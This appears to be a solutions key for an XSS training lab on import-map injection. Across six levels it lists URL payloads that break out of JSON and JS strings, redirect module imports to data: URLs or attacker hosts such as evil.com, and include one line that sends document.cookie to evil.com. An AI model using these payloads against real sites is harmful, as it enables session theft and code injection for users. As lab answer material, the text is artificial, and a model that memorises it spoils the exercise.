# import-map — solutions

Reflection into `<script type="importmap">` JSON or dynamic `import()` specifier. A user-controlled module URL can return JS that the browser executes, effectively hijacking module imports.

## Attack Overview

Import maps allow web applications to control the resolution of JavaScript module specifiers. When user input is reflected into an import map without proper sanitization, attackers can:
1. Break out of the JSON structure and inject script tags
2. Break out of JavaScript string contexts to execute code
3. Overwrite module paths to point to malicious scripts (data: URLs or attacker-controlled domains)
4. Hijack legitimate module imports that the application depends on

### import-map-level1

`/import-map/level1/?query=data:text/javascript,alert(1)`

- payload: `data:text/javascript,alert(1)`
- context: importmap JSON value in double-quoted property; application then calls `import('whitelisted-module').then()` which loads the attacker's data: URL
- alternative: `https://evil.com/malicious.js` to load from attacker domain

**Breaking out of JSON:**
`/import-map/level1/?query=%22%7D%7D%3C%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E`
- payload: `"}}</script><script>alert(1)</script>`
- context: close JSON structure and script tag, then inject new script

### import-map-level2

`/import-map/level2/?query=%27%7D%7D);alert(1);//`

- payload: `'}});alert(1);//`
- context: value embedded into `JSON.stringify({imports:{'user-module':userConfig}})` where userConfig is a JS variable containing user input; break out of the single-quoted JS string before it's stringified
- note: The import is delayed with setTimeout, so the hijacked module gets loaded after map creation

**Alternative payload for module hijacking:**
`/import-map/level2/?query=data:text/javascript,alert(document.domain)`
- payload: `data:text/javascript,alert(document.domain)`
- context: legitimate module path, hijacks the import to execute attacker code

### import-map-level3

`/import-map/level3/?query=data:text/javascript,alert(1)`

- payload: `data:text/javascript,alert(1)`
- context: double-quoted JSON property in importmap, subsequent code calls `import('analytics').then()` loading the data: URL

**Breaking out of JSON:**
`/import-map/level3/?query=%22%7D%7D%3C%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E`
- payload: `"}}</script><script>alert(1)</script>`
- context: close JSON and script tag, inject XSS

**Using attacker domain:**
`/import-map/level3/?query=https://attacker.com/steal-data.js`
- payload: `https://attacker.com/steal-data.js`
- context: redirect module load to attacker-controlled server

### import-map-level4

`/import-map/level4/?query=data:text/javascript,alert('Payment%20processor%20hijacked')`

- payload: `data:text/javascript,alert('Payment processor hijacked')`
- context: hijack critical "payment-processor" module with data: URL; application imports this expecting legitimate code

**Credential stealing payload:**
`/import-map/level4/?query=data:text/javascript,fetch('https://evil.com/log?cookies='+document.cookie)`
- payload: `data:text/javascript,fetch('https://evil.com/log?cookies='+document.cookie)`
- context: exfiltrate sensitive data when payment processor module is loaded

**Breaking out of JSON structure:**
`/import-map/level4/?query=%22,%22auth-lib%22:%22data:text/javascript,alert(2)`
- payload: `","auth-lib":"data:text/javascript,alert(2)`
- context: close current property and hijack additional module (auth-lib)

### import-map-level5

`/import-map/level5/?query=data:text/javascript,alert('Config%20hijacked')`

- payload: `data:text/javascript,alert('Config hijacked')`
- context: scoped package "@user/config" is hijacked while "@company/core" remains legitimate; demonstrates selective module hijacking

**Breaking out to hijack core module:**
`/import-map/level5/?query=%22,%22@company/core%22:%22data:text/javascript,alert(1)`
- payload: `","@company/core":"data:text/javascript,alert(1)`
- context: inject additional property to hijack the core company module

**Attacker domain payload:**
`/import-map/level5/?query=https://evil.com/fake-config.js`
- payload: `https://evil.com/fake-config.js`
- context: load malicious configuration from attacker server

### import-map-level6

`/import-map/level6/?query=data:text/javascript,alert('Scoped%20hijack')`

- payload: `data:text/javascript,alert('Scoped hijack')`
- context: import map uses scopes with "/app/" prefix; user input in "custom-util" mapping within that scope

**Breaking out of scopes:**
`/import-map/level6/?query=%22%7D,%22/app2/%22:{%22other%22:%22data:text/javascript,alert(2)`
- payload: `"},"app2/":{"other":"data:text/javascript,alert(2)`
- context: close current scope and create new scope entry

**Complex scope manipulation:**
`/import-map/level6/?query=%22%7D%7D,%22imports%22:{%22lodash/%22:%22data:text/javascript,alert(3)`
- payload: `"}},"imports":{"lodash/":"data:text/javascript,alert(3)`
- context: close scopes object and add new imports mapping to override the legitimate lodash CDN

## Key Takeaways

1. **Module Hijacking**: Import maps allow rewriting module paths before import, so user input can redirect `import('trusted-module')` to attacker code
2. **Data URLs**: `data:text/javascript,` URLs are powerful for inline code execution without external hosting
3. **Context Breaking**: Depending on where input lands (JSON, JS string, etc.), different escape sequences work
4. **Legitimate Appearance**: Hijacked imports look like normal module loads in application code, making detection harder
5. **Scope Complexity**: Import map scopes add another layer of complexity attackers can exploit
